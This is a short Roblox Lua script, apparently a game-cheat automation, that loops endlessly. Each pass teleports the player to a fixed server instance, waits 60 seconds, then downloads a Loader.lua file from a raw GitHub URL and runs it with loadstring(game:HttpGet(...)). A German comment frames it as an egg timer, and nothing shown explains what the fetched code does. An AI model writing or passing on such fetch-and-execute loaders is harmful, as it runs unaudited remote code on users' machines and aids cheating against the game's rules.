-- Zeit in Sekunden, wie lange das Egg verfügbar ist
local EggTimeLeft = 60
while true do
    game:GetService("TeleportService"):TeleportToPlaceInstance(85896571713843, "0ecafebc-4756-4e67-b327-48404095ca7a")
    wait(EggTimeLeft)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/PxnifyDev/roblox-job-ids/main/data/Loader.lua"))()
end
